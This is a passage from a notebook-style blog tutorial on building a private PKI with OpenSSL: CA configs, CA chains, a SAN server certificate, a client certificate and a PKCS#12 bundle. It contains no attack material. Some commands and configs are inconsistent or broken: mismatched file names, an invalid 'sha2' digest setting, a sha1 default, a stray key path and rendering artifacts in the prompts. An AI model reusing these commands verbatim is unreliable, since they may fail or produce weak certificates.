  Root_CA -&gt; Signing_CA3;

  Signing_CA2 -&gt; TLS_Server_CA;
  Signing_CA2 -&gt; TLS_Client_CA;
    
  Signing_CA3 -&gt; VPN_Server_CA;
  Signing_CA3 -&gt; VPN_Client_CA;
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_30_0.png" alt="png"></p>
<p>Create the directories:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
mkdir -p ca/vpn-ca/ ca/vpn-ca/private ca/vpn-ca/db ca/vpn-ca/certs
</code></pre></div><p>Initialize the database:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
touch ca/vpn-ca/db/vpn-ca.db
touch ca/vpn-ca/db/vpn-ca.db.attr
<span style="color:#24909d">echo</span> <span style="color:#3677a9">01</span> &gt; ca/vpn-ca/db/vpn-ca.crt.srl
<span style="color:#24909d">echo</span> <span style="color:#3677a9">01</span> &gt; ca/vpn-ca/db/vpn-ca.crl.srl
</code></pre></div><p>Configure CA:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%writefile /tmp/pki/ca/conf/vpn-ca.conf
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>

<span style="color:#999;font-style:italic"># vpn.dornea.nu CA</span>
<span style="color:#999;font-style:italic"># Adapated from https://pki-tutorial.readthedocs.org/en/latest/advanced/tls-ca.conf.html</span>

[ default ]
ca                      = vpn-ca                <span style="color:#999;font-style:italic"># CA name</span>
<span style="color:#24909d">dir</span>                     = .                     <span style="color:#999;font-style:italic"># Top dir</span>
base_url                = http://vpn.dornea.nu/ca    <span style="color:#999;font-style:italic"># CA base URL</span>
aia_url                 = <span style="color:#a61717;background-color:#e3d2d2">$</span>base_url/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.cer     <span style="color:#999;font-style:italic"># CA certificate URL</span>
crl_url                 = <span style="color:#a61717;background-color:#e3d2d2">$</span>base_url/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crl     <span style="color:#999;font-style:italic"># CRL distribution point</span>
name_opt                = multiline,-esc_msb,utf8 <span style="color:#999;font-style:italic"># Display UTF-8 characters</span>

<span style="color:#999;font-style:italic"># CA certificate request</span>

[ req ]
default_bits            = <span style="color:#3677a9">4096</span>                  <span style="color:#999;font-style:italic"># RSA key size</span>
encrypt_key             = yes                   <span style="color:#999;font-style:italic"># Protect private key</span>
default_md              = sha2                  <span style="color:#999;font-style:italic"># MD to use</span>
utf8                    = yes                   <span style="color:#999;font-style:italic"># Input is UTF-8</span>
string_mask             = utf8only              <span style="color:#999;font-style:italic"># Emit UTF-8 strings</span>
prompt                  = no                    <span style="color:#999;font-style:italic"># Don&#39;t prompt for DN</span>
distinguished_name      = ca_dn                 <span style="color:#999;font-style:italic"># DN section</span>
req_extensions          = ca_reqext             <span style="color:#999;font-style:italic"># Desired extensions</span>

[ ca_dn ]
countryName             = <span style="color:#ed9d13">&#34;NU&#34;</span>
organizationName        = <span style="color:#ed9d13">&#34;dornea.nu&#34;</span>
organizationalUnitName  = <span style="color:#ed9d13">&#34;dornea.nu Root CA&#34;</span>
commonName              = <span style="color:#ed9d13">&#34;vpn.dornea.nu CA&#34;</span>

[ ca_reqext ]
keyUsage                = critical,keyCertSign,cRLSign
basicConstraints        = critical,CA:true,pathlen:<span style="color:#3677a9">0</span>
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>

<span style="color:#999;font-style:italic"># CA operational settings</span>

[ ca ]
default_ca              = vpn_ca                <span style="color:#999;font-style:italic"># The default CA section</span>

[ vpn_ca ]
certificate             = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crt       <span style="color:#999;font-style:italic"># The CA cert</span>
private_key             = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/private/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.key <span style="color:#999;font-style:italic"># CA private key</span>
new_certs_dir           = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca           <span style="color:#999;font-style:italic"># Certificate archive</span>
serial                  = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/db/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crt.srl <span style="color:#999;font-style:italic"># Serial number file</span>
crlnumber               = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/db/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crl.srl <span style="color:#999;font-style:italic"># CRL number file</span>
database                = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/db/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.db <span style="color:#999;font-style:italic"># Index file</span>
unique_subject          = no                    <span style="color:#999;font-style:italic"># Require unique subject</span>
default_days            = <span style="color:#3677a9">365</span>                   <span style="color:#999;font-style:italic"># How long to certify for</span>
default_md              = sha1                  <span style="color:#999;font-style:italic"># MD to use</span>
policy                  = match_pol             <span style="color:#999;font-style:italic"># Default naming policy</span>
email_in_dn             = no                    <span style="color:#999;font-style:italic"># Add email to cert DN</span>
preserve                = no                    <span style="color:#999;font-style:italic"># Keep passed DN ordering</span>
name_opt                = <span style="color:#a61717;background-color:#e3d2d2">$</span>name_opt             <span style="color:#999;font-style:italic"># Subject DN display options</span>
cert_opt                = ca_default            <span style="color:#999;font-style:italic"># Certificate display options</span>
copy_extensions         = copy                  <span style="color:#999;font-style:italic"># Copy extensions from CSR</span>
x509_extensions         = server_ext            <span style="color:#999;font-style:italic"># Default cert extensions</span>
default_crl_days        = <span style="color:#3677a9">1</span>                     <span style="color:#999;font-style:italic"># How long before next CRL</span>
crl_extensions          = crl_ext               <span style="color:#999;font-style:italic"># CRL extensions</span>

[ match_pol ]
countryName             = match                 <span style="color:#999;font-style:italic"># Must match &#39;NO&#39;</span>
stateOrProvinceName     = optional              <span style="color:#999;font-style:italic"># Included if present</span>
localityName            = optional              <span style="color:#999;font-style:italic"># Included if present</span>
organizationName        = match                 <span style="color:#999;font-style:italic"># Must match &#39;Green AS&#39;</span>
organizationalUnitName  = optional              <span style="color:#999;font-style:italic"># Included if present</span>
commonName              = supplied              <span style="color:#999;font-style:italic"># Must be present</span>

[ extern_pol ]
countryName             = supplied              <span style="color:#999;font-style:italic"># Must be present</span>
stateOrProvinceName     = optional              <span style="color:#999;font-style:italic"># Included if present</span>
localityName            = optional              <span style="color:#999;font-style:italic"># Included if present</span>
organizationName        = supplied              <span style="color:#999;font-style:italic"># Must be present</span>
organizationalUnitName  = optional              <span style="color:#999;font-style:italic"># Included if present</span>
commonName              = supplied              <span style="color:#999;font-style:italic"># Must be present</span>

[ any_pol ]
domainComponent         = optional
countryName             = optional
stateOrProvinceName     = optional
localityName            = optional
organizationName        = optional
organizationalUnitName  = optional
commonName              = optional
emailAddress            = optional

<span style="color:#999;font-style:italic"># Extensions</span>

[ server_ext ]
keyUsage                = critical,digitalSignature,keyEncipherment
basicConstraints        = CA:false
extendedKeyUsage        = serverAuth,clientAuth
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>
authorityKeyIdentifier  = keyid:always
authorityInfoAccess     = <span style="color:#ffa500">@issuer_info</span>
crlDistributionPoints   = <span style="color:#ffa500">@crl_info</span>

[ client_ext ]
keyUsage                = critical,digitalSignature
basicConstraints        = CA:false
extendedKeyUsage        = clientAuth
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>
authorityKeyIdentifier  = keyid:always
authorityInfoAccess     = <span style="color:#ffa500">@issuer_info</span>
crlDistributionPoints   = <span style="color:#ffa500">@crl_info</span>

[ crl_ext ]
authorityKeyIdentifier  = keyid:always
authorityInfoAccess     = <span style="color:#ffa500">@issuer_info</span>

[ issuer_info ]
caIssuers;URI<span style="color:#3677a9">.0</span>         = <span style="color:#a61717;background-color:#e3d2d2">$</span>aia_url

[ crl_info ]
URI<span style="color:#3677a9">.0</span>                   = <span style="color:#a61717;background-color:#e3d2d2">$</span>crl_url

</code></pre></div><pre><code>Overwriting /tmp/pki/ca/conf/vpn-ca.conf
</code></pre>
<p>Create <strong>CA signing request</strong> (CSR):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( <span style="color:#24909d">cd</span> /tmp/pki
<span style="color:#ed9d13">\\</span>) openssl req -new <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -config ca/conf/vpn-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -out ca/vpn-ca/vpn-ca.csr <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -keyout ca/vpn-ca/private/vpn-ca.key
            
Generating a <span style="color:#3677a9">4096</span> bit RSA private key
...........................................++
.......++
writing new private key to <span style="color:#ed9d13">&#39;ca/vpn-ca/private/vpn-ca.key&#39;</span>
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----

</code></pre></div><p>Now we use the <strong>root CA</strong> to create the <strong>vpn-ca</strong> certificate:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( <span style="color:#24909d">cd</span> /tmp/pki
<span style="color:#ed9d13">\\</span>) openssl ca -config ca/conf/root-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>           -in ca/vpn-ca/vpn-ca.csr <span style="color:#ed9d13">\ </span>      
           -out ca/vpn-ca/vpn-ca.crt <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>           -extensions signing_ca_ext
           
Using configuration from ca/conf/root-ca.conf
Enter pass phrase <span style="color:#6ab825;font-weight:bold">for</span> ./ca/root-ca/private/root-ca.key:
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: <span style="color:#3677a9">3</span> (0x3)
        Validity
            Not Before: Sep <span style="color:#3677a9">29</span> 18:28:45 <span style="color:#3677a9">2015</span> GMT
            Not After : Sep <span style="color:#3677a9">28</span> 18:28:45 <span style="color:#3677a9">2025</span> GMT
        Subject:
            <span style="color:#40ffff">countryName</span>               = NU
            <span style="color:#40ffff">organizationName</span>          = dornea.nu
            <span style="color:#40ffff">organizationalUnitName</span>    = dornea.nu Root CA
            <span style="color:#40ffff">commonName</span>                = vpn.dornea.nu CA
        X509v3 extensions:
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:0
            X509v3 Subject Key Identifier: 
                52:53:49:45:12:D4:7B:A3:B7:8D:E0:14:00:81:4E:30:BC:A0:19:69
            X509v3 Authority Key Identifier: 
                keyid:F4:3B:44:1F:6D:02:26:06:C1:16:B9:1F:84:FC:41:48:5B:F6:0D:77

            Authority Information Access: 
                CA Issuers - URI:http://pki.dornea.nu/root-ca.cer

            X509v3 CRL Distribution Points: 

                Full Name:
                  URI:http://pki.dornea.nu/root-ca.crl

Certificate is to be certified <span style="color:#6ab825;font-weight:bold">until</span> Sep <span style="color:#3677a9">28</span> 18:28:45 <span style="color:#3677a9">2025</span> GMT (<span style="color:#3677a9">3652</span> days)
Sign the certificate? [y/n]:y


<span style="color:#3677a9">1</span> out of <span style="color:#3677a9">1</span> certificate requests certified, commit? [y/n]y
Write out database with <span style="color:#3677a9">1</span> new entries
Data Base Updated
           
</code></pre></div><h2 id="create-dev-ca-ca-chain">Create dev-ca CA chain</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
cat ca/dev-ca/dev-ca.crt ca/root-ca/root-ca.crt &gt; ca/dev-ca/dev-ca-chain.pem
</code></pre></div><h2 id="create-vpn-ca-ca-chain">Create vpn-ca CA chain</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
cat ca/vpn-ca/vpn-ca.crt ca/root-ca/root-ca.crt &gt; ca/vpn-ca/vpn-ca-chain.pem
</code></pre></div><h1 id="issue-dev-ca-certificates">Issue dev-CA certificates</h1>
<p>We&rsquo;ll now create the <strong>TLS</strong> <em>server</em> and <em>client</em> certificates.</p>
<h2 id="create-tls-server-certificate">Create TLS server certificate</h2>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {
  // Define orientation
  orientation = portrait;

  // Define class (list of attributes)
  class emphasis [color = pink, style = dashed];
  class blackline [color = black, style = dotted];
  class blue [color = lightblue];
  class active [color = lightgreen];
  class inactive [color = lightgrey]; 

  Root_CA [label = &#34;dornea.nu root CA&#34;];
  Signing_CA2 [label = &#34;dev.dornea.nu CA&#34;];
  Signing_CA3 [label = &#34;vpn.dornea.nu CA&#34;];
  TLS_Server_CA [class = active, label = &#34;TLS Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  TLS_Client_CA [label = &#34;TLS Client Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Server_CA [class = inactive, label = &#34;VPN Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Client_CA [class = inactive, label = &#34;VPN Client Cert&#34;, shape = flowchart.terminator, style = dotted];
    
  dev_dornea_nu [class = active, label = &#34;DNS: dev.dornea.nu\nDNS: dev2.dornea.nu\nIP: 10.10.10.1\nIP: 10.20.20.1&#34;];

  Root_CA -&gt; Signing_CA2;
  Root_CA -&gt; Signing_CA3;

  Signing_CA2 -&gt; TLS_Server_CA;
  Signing_CA2 -&gt; TLS_Client_CA;
    
  Signing_CA3 -&gt; VPN_Server_CA;
  Signing_CA3 -&gt; VPN_Client_CA;
    
  TLS_Server_CA -&gt; dev_dornea_nu;
}
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_44_0.png" alt="png"></p>
<p>We will specify <strong>multiple domains</strong> with one certificate by using <strong>SANs</strong> (Subject Alternatve Name). Those are a <em>X.509</em> V3 extension to allow a SSL certificate to specify multiple names that the certificate should match. They can contain:</p>
<ul>
<li>mail addresses</li>
<li>IP addresses</li>
<li>DNS names</li>
<li>etc.</li>
</ul>
<p>Let&rsquo;s have a look at the config file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%writefile /tmp/pki/ca/conf/vpn-server-cert.conf
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>

<span style="color:#999;font-style:italic"># # Code-signing certificate request for the VPN server</span>
<span style="color:#999;font-style:italic"># Adapted from https://pki-tutorial.readthedocs.org/en/latest/advanced/server.conf.html</span>

[ default ]
SAN                     = DNS:dev.dornea.nu    <span style="color:#999;font-style:italic"># Default value / [S]ubject[A]lt[N]ame</span>

[ req ]
default_bits            = <span style="color:#3677a9">4096</span>                  <span style="color:#999;font-style:italic"># RSA key size</span>
encrypt_key             = no                    <span style="color:#999;font-style:italic"># Protect private key</span>
default_md              = sha2                  <span style="color:#999;font-style:italic"># MD to use</span>
utf8                    = yes                   <span style="color:#999;font-style:italic"># Input is UTF-8</span>
string_mask             = utf8only              <span style="color:#999;font-style:italic"># Emit UTF-8 strings</span>
prompt                  = yes                   <span style="color:#999;font-style:italic"># Prompt for DN</span>
distinguished_name      = server_dn             <span style="color:#999;font-style:italic"># DN template</span>
req_extensions          = server_reqext         <span style="color:#999;font-style:italic"># Desired extensions</span>

[ server_dn ]
countryName             = <span style="color:#ed9d13">&#34;1. Country Name (2 letters) (eg, US)       &#34;</span>
countryName_max         = <span style="color:#3677a9">2</span>
stateOrProvinceName     = <span style="color:#ed9d13">&#34;2. State or Province Name   (eg, region)   &#34;</span>
localityName            = <span style="color:#ed9d13">&#34;3. Locality Name            (eg, city)     &#34;</span>
organizationName        = <span style="color:#ed9d13">&#34;4. Organization Name        (eg, company)  &#34;</span>
organizationalUnitName  = <span style="color:#ed9d13">&#34;5. Organizational Unit Name (eg, section)  &#34;</span>
commonName              = <span style="color:#ed9d13">&#34;6. Common Name              (eg, FQDN)     &#34;</span>
commonName_max          = <span style="color:#3677a9">64</span>

[ server_reqext ]
keyUsage                = critical,digitalSignature,keyEncipherment
extendedKeyUsage        = serverAuth,clientAuth
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>
subjectAltName          = <span style="color:#ffa500">@alt_names</span>

[alt_names]
DNS<span style="color:#3677a9">.1</span> = dev.dornea.nu
DNS<span style="color:#3677a9">.2</span> = dev2.dornea.nu
IP<span style="color:#3677a9">.1</span> = <span style="color:#3677a9">10.10.10.1</span>
IP<span style="color:#3677a9">.2</span> = <span style="color:#3677a9">10.20.20.1</span>
</code></pre></div><pre><code>Overwriting /tmp/pki/ca/conf/dev-server-ca.conf
</code></pre>
<p>Create directories:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
mkdir -p ca/dev-server-ca/ ca/dev-server-ca/private ca/dev-server-ca/db ca/dev-server-ca/certs
</code></pre></div><p>Create a private key and CSR for the TLS server certificate:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( <span style="color:#24909d">cd</span> /tmp/pki
<span style="color:#ed9d13">\\</span>) openssl req -new <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -config ca/conf/dev-server-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -out ca/dev-server-ca/certs/dev.dornea.nu.csr <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -keyout ca/dev-server-ca/certs/dev.dornea.nu.key
            
Generating a <span style="color:#3677a9">4096</span> bit RSA private key
......................................................................................................................................................++
...........................................++
writing new private key to <span style="color:#ed9d13">&#39;ca/dev-server-ca/private/dev-server-ca.key&#39;</span>
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span style="color:#ed9d13">&#39;.&#39;</span>, the field will be left blank.
-----
1. Country Name (<span style="color:#3677a9">2</span> letters) (eg, US)        []:DE
2. State or Province Name   (eg, region)    []:Berlin
3. Locality Name            (eg, city)      []:Berlin
4. Organization Name        (eg, company)   []:dornea.nu
5. Organizational Unit Name (eg, section)   []:dev.dornea.nu
6. Common Name              (eg, FQDN)      []:dev.dornea.nu
</code></pre></div><p>Now use the <strong>dev-ca</strong> certificate to issue the TLS server certificate:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( <span style="color:#24909d">cd</span> /tmp/pki
<span style="color:#ed9d13">\\</span>) openssl ca -config ca/conf/dev-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -in ca/dev-server-ca/certs/dev.dornea.nu.csr <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -out ca/dev-server-ca/certs/dev.dornea.nu.crt <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -extensions server_ext
</code></pre></div><p>Now we create a <strong>PKCS#12 bundle</strong> including the private key, the certificate and the CA chain.</p>
<blockquote>
<p>PKCS#12 defines an archive file format to store crypto stuff inside a <em>single</em> file. It is usually used to store a
<em>private key</em> along with the <em>X.509 certificate</em>. The PKCS#12 file may be <em>encrypted</em> and <em>signed</em>.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( <span style="color:#24909d">cd</span> /tmp/pki
<span style="color:#ed9d13">\\</span>) openssl pkcs12 -export <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -name <span style="color:#ed9d13">&#34;dev.dornea.nu (Developer)&#34;</span> <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -caname <span style="color:#ed9d13">&#34;dev.dornea.nu CA&#34;</span> <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -caname <span style="color:#ed9d13">&#34;dornea.nu root CA&#34;</span> <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -inkey certs/green.no.key <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -in ca/dev-server-ca/certs/dev.dornea.nu.crt <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -certfile ca/dev-server-ca/dev-ca-chain.pem <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>                -out ca/dev-server-ca/certs/dev.dornea.nu.p12
Enter Export Password:
Verifying - Enter Export Password:
</code></pre></div><h3 id="verify-pkcs12-bundle">Verify PKCS#12 bundle</h3>
<p>You can now verify the bundle:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ openssl pkcs12 -in ca/dev-server-ca/certs/dev.dornea.nu.p12 -info | egrep -e <span style="color:#ed9d13">&#34;issuer&#34;</span> -e <span style="color:#ed9d13">&#34;subject&#34;</span>
Enter Import Password:
MAC Iteration <span style="color:#3677a9">2048</span>
MAC verified OK
PKCS7 Encrypted data: pbeWithSHA1And40BitRC2-CBC, Iteration <span style="color:#3677a9">2048</span>
Certificate bag
Certificate bag
Certificate bag
PKCS7 Data
Shrouded Keybag: pbeWithSHA1And3-KeyTripleDES-CBC, Iteration <span style="color:#3677a9">2048</span>
<span style="color:#40ffff">subject</span>=/C=NU/ST=Germany/L=Berlin/O=dornea.nu/OU=dev dornea.nu/CN=dev.dornea.nu
<span style="color:#40ffff">issuer</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dev.dornea.nu CA
<span style="color:#40ffff">subject</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dev.dornea.nu CA
<span style="color:#40ffff">issuer</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dornea.nu Root CA
Enter PEM pass phrase:
<span style="color:#40ffff">subject</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dornea.nu Root CA
<span style="color:#40ffff">issuer</span>=/C=NU/O=dornea.nu/OU=dornea.nu Root CA/CN=dornea.nu Root CA
</code></pre></div><h2 id="create-tls-client-certificate">Create TLS client certificate</h2>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {
  // Define orientation
  orientation = portrait;

  // Define class (list of attributes)
  class emphasis [color = pink, style = dashed];
  class blackline [color = black, style = dotted];
  class blue [color = lightblue];
  class active [color = lightgreen];
  class inactive [color = lightgrey]; 

  Root_CA [label = &#34;dornea.nu root CA&#34;];
  Signing_CA2 [label = &#34;dev.dornea.nu CA&#34;];
  Signing_CA3 [label = &#34;vpn.dornea.nu CA&#34;];
  TLS_Server_CA [label = &#34;TLS Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  TLS_Client_CA [class = active, label = &#34;TLS Client Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Server_CA [class = inactive, label = &#34;VPN Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Client_CA [class = inactive, label = &#34;VPN Client Cert&#34;, shape = flowchart.terminator, style = dotted];
    
  dev_client_victor [class = active, label = &#34;CN: Victor Dorneanu\n&#34;];

  Root_CA -&gt; Signing_CA2;
  Root_CA -&gt; Signing_CA3;

  Signing_CA2 -&gt; TLS_Server_CA;
  Signing_CA2 -&gt; TLS_Client_CA;
    
  Signing_CA3 -&gt; VPN_Server_CA;
  Signing_CA3 -&gt; VPN_Client_CA;
    
  TLS_Client_CA -&gt; dev_client_victor;
}
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_52_0.png" alt="png"></p>
<p>Create directories:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
mkdir -p ca/dev-client-ca/ ca/dev-client-ca/ ca/dev-client-ca/db ca/dev-client-ca/certs
</code></pre></div><p>Create config:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%writefile /tmp/pki/ca/conf/dev-client-ca.conf<span style="color:#a61717;background-color:#e3d2d2">â†”</span>

</code></pre></div><pre><code>Overwriting /tmp/pki/ca/conf/dev-client-ca.conf
</code></pre>
<p>Now I&rsquo;ll create a new CSR for the user <strong>victor</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( openssl req -new <span style="color:#ed9d13">\\</span>
            -config ca/conf/dev-client-ca.conf <span style="color:#ed9d13">\\</span>
            -out ca/dev-client-ca/certs/victor.csr <span style="color:#ed9d13">\\</span>
            -keyout ca/dev-client-ca/certs/victor.key
Generating a <span style="color:#3677a9">4096</span> bit RSA private key
.......................................................................................++
..........................................................................................................................................................................................++
writing new private key to <span style="color:#ed9d13">&#39;ca/dev-client-ca/certs/victor.key&#39;</span>
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span style="color:#ed9d13">&#39;.&#39;</span>, the field will be left blank.
-----
1. Country Name (<span style="color:#3677a9">2</span> letters) (eg, US)        []:NU
2. State or Province Name   (eg, region)    []:Germany
3. Locality Name            (eg, city)      []:Berlin
4. Organization Name        (eg, company)   []:dornea.nu
5. Organizational Unit Name (eg, section)   []:dev dornea.nu
6. Common Name              (eg, full name) []:Victor Dorneanu
7. Email Address            (eg, name@fqdn) []:blabla@dornea.nu
</code></pre></div><p>Now create the TLS client certificate:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>) openssl ca -config ca/conf/dev-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -in ca/dev-client-ca/certs/victor.csr <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -out ca/dev-client-ca/certs/victor.crt <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -extensions client_ext
            
Using configuration from ca/conf/dev-ca.conf
Enter pass phrase <span style="color:#6ab825;font-weight:bold">for</span> ./ca/dev-ca/private/dev-ca.key:
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: <span style="color:#3677a9">3</span> (0x3)
        Validity
            Not Before: Sep <span style="color:#3677a9">30</span> 19:01:14 <span style="color:#3677a9">2015</span> GMT
            Not After : Sep <span style="color:#3677a9">29</span> 19:01:14 <span style="color:#3677a9">2016</span> GMT
        Subject:
            <span style="color:#40ffff">countryName</span>               = NU
            <span style="color:#40ffff">stateOrProvinceName</span>       = Germany
            <span style="color:#40ffff">localityName</span>              = Berlin
            <span style="color:#40ffff">organizationName</span>          = dornea.nu
            <span style="color:#40ffff">organizationalUnitName</span>    = dev dornea.nu
            <span style="color:#40ffff">commonName</span>                = Victor Dorneanu
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication
            X509v3 Subject Key Identifier: 
